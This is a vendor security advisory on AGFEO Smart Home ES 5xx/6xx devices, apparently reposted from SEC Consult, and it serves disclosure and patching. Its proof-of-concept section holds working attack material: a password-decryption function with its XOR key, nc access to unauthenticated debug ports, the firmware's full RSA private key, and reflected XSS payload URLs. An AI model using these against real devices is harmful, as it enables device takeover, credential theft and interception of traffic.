@@ -1,0 +1,328 @@
+id: 28123
+date: 07/13/2017
+title: AGFEO Smart Home ES 5xx / 6xx Authentication Bypass / XSS / Hardcoded Credentials Vulnerabilities
+author: Tim Weber
+cves: 
+
+title: Multiple critical vulnerabilities
+            product: AGFEO Smart Home ES 5xx
+                     AGFEO Smart Home ES 6xx
+ vulnerable version: at least 1.9b, 1.10
+      fixed version: 1.12c
+         CVE number: -
+             impact: Critical
+           homepage: https://www.agfeo.de/
+              found: 2016-12-28
+                 by: T. Weber (Office Vienna)
+                     SEC Consult Vulnerability Lab
+
+                     An integrated part of SEC Consult
+                     Bangkok - Berlin - Linz - Luxembourg - Montreal - Moscow
+                     Kuala Lumpur - Singapore - Vienna (HQ) - Vilnius - Zurich
+
+                     https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+AGFEO GmbH & Co. KG is a vendor of telephone systems and other
+(tele-)communication products like DECT phones, headsets or smart home
+products as well.
+
+
+Business recommendation:
+------------------------
+The available patches should be installed immediately.
+
+SEC Consult recommends not to use this product in a production environment
+until a thorough security review has been performed by security professionals
+as there are indications for further security issues.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Unauthenticated access to web services and authentication bypass
+A web service with multiple scripts for debug purposes is accessible
+on an unusual port on the device. There is also a script to read files from
+the filesystem. As the web service runs with root privileges all files
+on the operating system can be read by an attacker. This only affects the
+ES 5xx product line, all other vulnerabilities affect both ES 5xx and 6xx.
+
+The configuration of the device can be changed and arbitrary updates can be
+uploaded as well as music files for the answering machine. By reading the
+database content, the usernames and their passwords can be revealed and easily
+decrypted. This way the administrator password can be dumped from the database
+and the device can be fully administrated by an attacker.
+The normal user interface has an additional development subfolder which was
+probably used during the development process. Updates can be triggered from
+this sub platform and log files, statistics and states can also be displayed.
+
+
+2) Unauthenticated access to configuration ports
+Multiple different instances of TCP services are present on the device. Each
+of the listening sockets is forked from a debug and configuration service.
+Internal device information can be read from the device. Among other commands,
+the configuration of the device can also be altered by using these services.
+
+
+3) Hardcoded cryptographic keys
+Three certificates including their private keys are embedded in the firmware
+of AGFEO ES 5xx/6xx SmartHome products. The certificates and keys in both
+product lines are exactly the same. One certificate is used for HTTPS
+(default server certificate for web based configuration and management).
+
+Impersonation, man-in-the-middle or passive decryption attacks are possible.
+These attacks allow an attacker to gain access to sensitive information like
+admin credentials and use them in further attacks.
+
+
+4) Multiple reflected cross site scripting (XSS) vulnerabilities
+The ES 5xx SmartHome products are vulnerable to reflected cross site scripting.
+Malicious JavaScript code can be executed in the browser of a victim by luring
+to a handcrafted link. This is possible even if the victim is not logged in.
+It is assumed that the 6xx products are affected as well but those could not be
+tested.
+
+
+Proof of concept:
+-----------------
+1) Unauthenticated access to web services and authentication bypass
+The debug web service is available by using the following url:
+http://<Device-IP>:20011/index.html
+There are different scripts accessible, the following actions can be executed:
+    -) Change IP configuration
+    -) Change time zone
+    -) Upload updates (Any files can be uploaded to the device!)
+    -) Read all files on the filesystem
+    -) Play, delete and move voice messages on all mail boxes
+    -) Converting mp3 files to wav files
+    -) List all connected phones and the related numbers
+
+The SQLite database is located under "/home/profile/poolstore.db". By reading
+this file the usernames and passwords can be dumped. The passwords are encoded
+with base64 and encrypted with XOR. To decrypt the XOR'ed password the
+following key has to be used:
+    "0x42 0xab 0xce 0xfa 0x54 0xed 0xcf 0xba"
+
+The function to decrypt the password was found in the php script "login.php":
+function decodePassword($PasswordEnc)
+{
+    $PasswordBinaryEncBase64 = "";
+    $PasswordBinaryEnc="";
+    $PasswordBinary = array();
+    $Password = "";
+    $lastChar=0;
+
+    $Key=array(0x42, 0xab, 0xce, 0xfa, 0x54, 0xed, 0xcf, 0xba);
+
+    $PasswordBinaryEncBase64 = $PasswordEnc;
+
+    // base64 decode
+    $PasswordBinaryEnc = base64_decode($PasswordBinaryEncBase64);
+
+    // xor decode
+    for($i=0; $i<strlen($PasswordBinaryEnc); $i++) {
+        $PasswordBinary[$i] = ord($PasswordBinaryEnc[$i]) ^ $Key[$i % count($Key)]
+^ $lastChar;
+        $lastChar = ord($PasswordBinaryEnc[$i]);
+    }
+
+    // erstes Zeichen entfernen (random char!)
+    foreach ($PasswordBinary as $chr) {
+      $Password .= chr($chr);
+    }
+    $Password = substr($Password, 1);
+    // printf("%s:%d  Password %s\n", __FUNCTION__, __LINE__, $Password);
+    return $Password;
+}
+
+An additional subfolder, which contains debug scripts, is available under the
+following location:
+http://<Device-IP>/shdev/ui9.php
+
+Updates can be triggered, logs can be shown and status messages can be gathered
+within this functionality. Furthermore, it is possible to debug the login
+process. Since there is a hardcoded user "admin" a brute force attack is also
+possible.
+
+
+2) Unauthenticated access to configuration ports
+The following TCP ports can be accessed with "nc <Device-IP> -p <Port>":
+19002, 19004, 19006, 19009, 19010, 19080, 19081
+By connecting to one of these ports a debug interface spawns. For example the
+connection to port 19081:
+$ nc 192.168.0.40 19081
+Start Menue: <Return>
+========< UPDS - Menue >========
+s:  show state
+h:  help
+D:  DEBmod on
+d:  DEBmod off
+L:  LOG on
+l:  LOG off
+S:  SERVICE-SUBMENUE
+q:  Quit telnet session
+========= NOT AKTIV ===========
+s
+status ausgeben (noch nicht vollstaendig implementiert)
+upds <Timestamp>    bState: 00
+upds <Timestamp>    bLastReceiveBlockNum: 15
+[...]
+S
+upds <Timestamp>
+upds <Timestamp>  ===== service-menue ======================
+upds <Timestamp>  help                 help
+upds <Timestamp>  q                    quit
+upds <Timestamp>  D                    dial
+upds <Timestamp>  d                    disconnect
+upds <Timestamp>  ============ NOT AKTIV ===================
+service submenue
+
+
+3) Hardcoded cryptographic keys
+Refer to our study on hardcoded cryptographic secrets in embedded systems for
+further information.
+http://blog.sec-consult.com/2016/09/house-of-keys-9-months-later-40-worse.html
+IoT Inspector (http://www.iot-inspector.com/) was used to identify this
+vulnerability.
+
+OpenSSL output for the certificate:
+Certificate:
+    Data:
+        Version: 1 (0x0)
+        Serial Number: 10293758115057549292 (0x8edac6778bccbfec)
+    Signature Algorithm: sha256WithRSAEncryption
+        Issuer: C=DE, ST=Some-State, L=Bielefeld, O=AGFEO GmbH & Co. KG, OU=Dev,
+CN=info/emailAddress=info@agfeo.de
+        Validity
+            Not Before: Oct 21 14:03:55 2014 GMT
+            Not After : Mar  8 14:03:55 2042 GMT
+        Subject: C=DE, ST=Some-State, L=Bielefeld, O=AGFEO GmbH & Co. KG, OU=Dev,
+CN=info/emailAddress=info@agfeo.de
+        Subject Public Key Info:
+            Public Key Algorithm: rsaEncryption
+                Public-Key: (2048 bit)
+                Modulus:
+                    00:be:79:ad:17:e8:c7:9e:63:b3:bb:67:ce:bd:79:
+                    29:66:22:ce:63:99:6a:a5:31:f4:70:5f:3f:9d:11:
+                    94:d6:65:8c:4e:43:6b:e4:d4:f1:f4:bd:81:4c:72:
+                    67:50:10:09:b8:60:b3:cd:be:23:ce:9a:75:ec:e4:
+                    7a:cf:3a:e2:f0:51:f9:a5:f3:c5:67:5d:01:e9:72:
+                    68:b1:59:f5:5b:d8:dc:3e:1d:00:df:06:a6:07:06:
+                    12:70:c7:97:05:a5:da:80:14:2c:c7:ae:6a:ef:a1:
+                    1a:b8:f8:6b:71:5e:91:04:da:43:ba:cf:7c:ef:bd:
+                    01:b7:15:a1:7b:8f:52:21:06:ad:48:b4:57:0c:b2:
+                    ac:b2:14:fe:30:38:96:5e:28:b8:68:b2:d3:ee:8d:
+                    28:3c:ac:a0:95:c8:07:39:b7:df:95:6d:88:a2:12:
+                    77:31:a8:55:f6:ab:c7:17:16:03:5f:ca:f2:ca:8f:
+                    fd:37:65:2c:b0:aa:47:59:fe:d6:ec:69:8f:db:b6:
+                    9e:93:4b:f0:87:77:90:f6:5c:e4:64:d1:96:99:d5:
+                    d8:37:e4:7d:2f:bd:f4:04:fd:67:13:bc:68:ea:e6:
+                    00:dd:72:74:a2:fe:1a:00:27:8b:b8:96:a6:0c:93:
+                    82:52:6d:61:2c:62:02:b2:e8:ab:45:e4:87:98:d2:
+                    ba:57
+                Exponent: 65537 (0x10001)
+    Signature Algorithm: sha256WithRSAEncryption
+         37:12:cb:94:9a:51:f8:9a:04:9f:60:19:6a:12:23:38:10:85:
+         b5:79:2b:49:5d:b6:65:82:76:c0:0b:20:d1:bf:04:ce:46:38:
+         56:ea:0b:2e:41:f5:61:d1:12:d4:ce:34:d9:e3:2a:bb:e8:9f:
+         f1:0e:0d:da:37:91:ee:92:dd:9a:85:91:14:a2:21:87:da:52:
+         33:d6:ec:74:c0:3a:46:7f:82:02:91:75:99:ad:fd:72:1b:ec:
+         00:64:10:e1:9c:81:3b:c9:8e:6b:73:d5:e1:df:7b:60:d4:b6:
+         08:51:30:25:b1:a0:ed:f0:de:2e:15:33:c2:bf:c3:fe:69:1b:
+         a8:26:c3:25:f0:53:8e:1f:8a:aa:44:f4:59:88:5b:7d:27:d6:
+         a5:a9:e8:26:a9:ba:75:f0:84:5d:e0:e7:03:75:a0:a6:64:c4:
+         16:ce:88:16:ca:72:f2:43:7a:08:b5:e3:48:d7:c3:a1:3a:28:
+         43:3c:5a:30:d4:31:dc:68:a5:5c:da:7c:20:7b:ee:e6:a2:04:
+         a3:3e:f1:5d:39:f4:89:d7:f0:f3:b4:e6:5e:81:cd:60:34:61:
+         ef:e1:d8:59:f9:d0:5a:11:af:53:03:93:4a:9e:fb:1e:a3:8b:
+         94:90:de:59:91:59:ff:f3:1b:5a:ef:7f:aa:33:c2:47:50:05:
+         0a:bc:62:3c
+
+Certificate:
+-----BEGIN CERTIFICATE-----
+MIIDnDCCAoQCCQCO2sZ3i8y/7DANBgkqhkiG9w0BAQsFADCBjzELMAkGA1UEBhMC
+REUxEzARBgNVBAgMClNvbWUtU3RhdGUxEjAQBgNVBAcMCUJpZWxlZmVsZDEcMBoG
+A1UECgwTQUdGRU8gR21iSCAmIENvLiBLRzEMMAoGA1UECwwDRGV2MQ0wCwYDVQQD
+DARpbmZvMRwwGgYJKoZIhvcNAQkBFg1pbmZvQGFnZmVvLmRlMB4XDTE0MTAyMTE0
+MDM1NVoXDTQyMDMwODE0MDM1NVowgY8xCzAJBgNVBAYTAkRFMRMwEQYDVQQIDApT
+b21lLVN0YXRlMRIwEAYDVQQHDAlCaWVsZWZlbGQxHDAaBgNVBAoME0FHRkVPIEdt
+YkggJiBDby4gS0cxDDAKBgNVBAsMA0RldjENMAsGA1UEAwwEaW5mbzEcMBoGCSqG
+SIb3DQEJARYNaW5mb0BhZ2Zlby5kZTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
+AQoCggEBAL55rRfox55js7tnzr15KWYizmOZaqUx9HBfP50RlNZljE5Da+TU8fS9
+gUxyZ1AQCbhgs82+I86adezkes864vBR+aXzxWddAelyaLFZ9VvY3D4dAN8GpgcG
+EnDHlwWl2oAULMeuau+hGrj4a3FekQTaQ7rPfO+9AbcVoXuPUiEGrUi0VwyyrLIU
+/jA4ll4ouGiy0+6NKDysoJXIBzm335VtiKISdzGoVfarxxcWA1/K8sqP/TdlLLCq
+R1n+1uxpj9u2npNL8Id3kPZc5GTRlpnV2DfkfS+99AT9ZxO8aOrmAN1ydKL+GgAn
+i7iWpgyTglJtYSxiArLoq0Xkh5jSulcCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEA
+NxLLlJpR+JoEn2AZahIjOBCFtXkrSV22ZYJ2wAsg0b8EzkY4VuoLLkH1YdES1M40
+2eMqu+if8Q4N2jeR7pLdmoWRFKIhh9pSM9bsdMA6Rn+CApF1ma39chvsAGQQ4ZyB
+O8mOa3PV4d97YNS2CFEwJbGg7fDeLhUzwr/D/mkbqCbDJfBTjh+KqkT0WYhbfSfW
+panoJqm6dfCEXeDnA3WgpmTEFs6IFspy8kN6CLXjSNfDoTooQzxaMNQx3GilXNp8
+IHvu5qIEoz7xXTn0idfw87TmXoHNYDRh7+HYWfnQWhGvUwOTSp77HqOLlJDeWZFZ
+//MbWu9/qjPCR1AFCrxiPA==
+-----END CERTIFICATE-----
+
+Private Key:
+-----BEGIN PRIVATE KEY-----
+MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQC+ea0X6MeeY7O7
+Z869eSlmIs5jmWqlMfRwXz+dEZTWZYxOQ2vk1PH0vYFMcmdQEAm4YLPNviPOmnXs
+5HrPOuLwUfml88VnXQHpcmixWfVb2Nw+HQDfBqYHBhJwx5cFpdqAFCzHrmrvoRq4
++GtxXpEE2kO6z3zvvQG3FaF7j1IhBq1ItFcMsqyyFP4wOJZeKLhostPujSg8rKCV
+yAc5t9+VbYiiEncxqFX2q8cXFgNfyvLKj/03ZSywqkdZ/tbsaY/btp6TS/CHd5D2
+XORk0ZaZ1dg35H0vvfQE/WcTvGjq5gDdcnSi/hoAJ4u4lqYMk4JSbWEsYgKy6KtF
+5IeY0rpXAgMBAAECggEAI7joKJrEjUT/mT8Pu+M0S25trKpCIPcsc8K5SHjapBbp
+aGgmnQT+17qOvEqca5yGZijkr8pgJsg7I5F6ItFVbGLDYkdEl20PBbwqPFC1vmL+
+czu3RRyXGKwf2zzjavC++NRPzac9cPGS9GvKorlsky9oEmoFcWTOJIsO/QBVE9I8
+hPc5utxQQ5WTDfUD84Y2ELJx/qhZNB8gOF+KhDQT0slE1/7Y7sHMi++kxVj+KiVb
+Kif3DxpB6reMP5s1zhmfJcF9pPrr6jT35OuEjQ15y9p9wrLL1txfJbi3O6Ucwd3q
+INHugNN/v+/6ia06aZtknxYoG+hFS7PbulU11VSimQKBgQDzoQRtO0MjEo3Gucqi
+iaxpueYsAizJx9GkdCh7StN8ZWADpZj6x7B6vIhjXZO6Q5bM6j838lYWyNYsBHpq
+FXeAM8cPIm7xUpRQDLKfhU9YA9/6iQ8/dzTYR49uj67syc9HH9dIOsRyVAy2ci6S
+UySE3aTSCJCwSerpFZWoPqsbOwKBgQDIJbQQg+QnAOdTYdmIQv8zW6nLvuwLzNkP
+wxFlZ/78DI8+2h1H5LGd/2C2ybKIsif/pU5u721qkqxIrIc1I3BWcX+O+QwiJ1oO
+SBeA3gzcD7IOpW2GqyN8tt8cWo48moDjIcSYGB6mSd0WmX7MfsOxnEybLWQIKHD4
+sTclSDuTlQKBgQDZyRGk97oPazGT+Vf8LmgS5xysMJGLG3X7td7OQFiHtjO7btgv
+Lj1Dqq+da/R4KJ1wtuImiBqPKZ/TH3myxVfbIe4LSHO2hGSSnpc65LfF7UjWtJkN
+2elCgc3lPspXYBxL71nKdsZPkXT/z1h0c6CMqXoCS6fT/2/gRuxOxx68KwKBgQCo
+SEM465wmSzU0v34GesZWKUj/nXycg1UyUoJK8ADNbcX3Q68A5sGMpc9sgPQSyTCm
+WxgyYC9wPviKdj2MqUpn9DAbRz0zbkDi5yyT1p+bW7sLY35Oj5Bb6Op4zY7wV7vs
+vVStyQHkMRCqUs7xI9hoepFSm/ySe2ZZQ6+pMi2dbQKBgQCn9FdGZzWOAIXrfj7Q
+SoMEUPEIEdxXYEy8Rudh9VVIJQW4tvYX6mQMr8fgx5RKRaTsL1Qv/tn9XGq00wes
+3NuLEq2urJAC7z8smqkvWm2xo91j+ExeRL66CfPdm5KPyaCXcuFysz5/LUKxG/a3
++K62TQB1mEb1t9WQsxJYGcUiyg==
+-----END PRIVATE KEY-----
+
+
+4) Multiple reflected cross site scripting (XSS) vulnerabilities
+The following crafted requests can be used to trigger the cross site scripting
+vulnerability at different entry points:
+http://<Device-IP>:20011/ais.php/%22%3E%3Cscript%3Ealert%28'XSS'%29%3C%2fscript%3E
+http://<Device-IP>:20011/xtopbxwav.php/%22%3E%3Cscript%3Ealert%28'XSS'%29%3C%2fscript%3E
+http://<Device-IP>:20011/update.php/%22%3E%3Cscript%3Ealert%28'XSS'%29%3C%2fscript%3E
+http://<Device-IP>/pbxapi/licence.php/%3Cimg%20src=x%20onerror=alert%28'XSS'%29%3E
+http://<Device-IP>/pbxapi/eoimport.php/%3Cimg%20src=x%20onerror=alert%28'XSS'%29%3E
+http://<Device-IP>/pbxapi/knximport.php/%3Cimg%20src=x%20onerror=alert%28'XSS'%29%3E
+http://<Device-IP>/pbxapi/hmimport.php/%3Cimg%20src=x%20onerror=alert%28'XSS'%29%3E
+
+
+Vulnerable / tested versions:
+-----------------------------
+One firmware is available for the whole ES 5 product line, and another one for
+the product line ES 6. Therefore, all vulnerabilities which have been found in
+one product of ES 5/6 are also available in all other products of ES 5/6.
+
+The following product / firmware version has been tested by SEC Consult:
+ES 512 Version 1.9b (es5xxv19b_c063be6)
+ES 512 Version 1.10 (es5xxv110_f105485)
+
+Based on results of the SEC Technologies IoT Inspector
+(http://www.iot-inspector.com/ - automated firmware analysis tool) we believe
+that the product line ES 6 is also prone to the identified vulnerabilities
+(except the web service on port 20011) as well as product line ES 5.
+
+Firmware Version 1.9b (ES6xxv19b_c063be67b9c2ba)
+Firmware Version 1.10 (ES6xxv110_f105485715a360)
+
+#  0day.today [2023-03-24]  #
